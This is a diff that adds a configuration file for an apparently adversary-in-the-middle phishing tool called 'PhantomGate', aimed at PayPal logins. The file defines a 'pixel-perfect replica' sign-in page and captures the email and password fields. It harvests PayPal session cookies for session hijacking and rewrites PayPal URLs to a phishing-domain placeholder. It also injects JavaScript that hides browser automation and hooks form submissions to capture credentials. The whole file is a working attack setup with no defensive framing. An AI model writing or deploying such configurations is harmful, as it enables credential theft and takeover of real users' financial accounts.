@@ -1,0 +1,65 @@
+name: PayPal
+author: PhantomGate
+version: 2.0.0
+description: PayPal authentication - Pixel-perfect replica
+
+auth:
+  domains:
+    - paypal.com
+    - www.paypal.com
+    - login.paypal.com
+  
+  login:
+    domain: www.paypal.com
+    path: /signin
+    username:
+      selector: "input#email"
+      capture: true
+    password:
+      selector: "input#password"
+      capture: true
+  
+  tokens:
+    cookies:
+      - name: X-PP-SFU
+        regex: ".*"
+      - name: X-PP-L7
+        regex: ".*"
+      - name: nsid
+        regex: ".*"
+      - name: x-csrf-token
+        regex: ".*"
+      - name: pxsid
+        regex: ".*"
+
+proxy:
+  hosts:
+    - domain: paypal.com
+      inject: true
+    - domain: www.paypal.com
+      inject: true
+  
+  sub_filters:
+    - domain: paypal.com
+      search: "https://www.paypal.com"
+      replace: "https://{phishing_domain}"
+
+injection:
+  js: |
+    // PhantomGate Injection - PayPal
+    (function() {
+      'use strict';
+      
+      // Override navigator properties
+      Object.defineProperty(navigator, 'webdriver', {get: () => false});
+      
+      // Capture form submissions
+      document.addEventListener('submit', function(e) {
+        var form = e.target;
+        var username = form.querySelector('#email');
+        var password = form.querySelector('#password');
+        if (username && password) {
+          console.log('[PhantomGate] PayPal credentials captured');
+        }
+      }, true);
+    })();
